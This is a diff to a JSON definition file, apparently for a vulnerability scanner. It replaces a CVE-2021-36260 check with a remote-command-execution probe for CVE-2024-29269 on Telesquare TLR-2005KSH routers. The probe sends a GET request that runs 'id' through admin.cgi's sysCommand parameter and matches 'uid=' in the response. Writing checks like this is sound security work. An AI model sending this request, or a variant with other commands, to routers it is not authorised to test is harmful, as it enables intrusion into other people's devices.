@@ -1,11 +1,14 @@
 [
     {
-        "name": "命令注入 CVE-2021-36260",
+        "name": "Telesquare TLR-2005KSH路由器 RCE漏洞(CVE-2024-29269)",
         "requests": {
             "method": "GET",
-            "payload": "/Security/users?auth=YWRtaW46MTEK",
+            "payload": "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id",
             "headers": {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55",
+                "Connection": "close",
+                "Accept": "*/*",
+                "Accept-Encoding": "gzip"
             },
             "dnslog": false,
             "sqltime": false,
@@ -13,7 +16,7 @@
         },
         "response": {
             "status_code": 200,
-            "text": "admin"
+            "text": "uid="
         }
     }
 ]
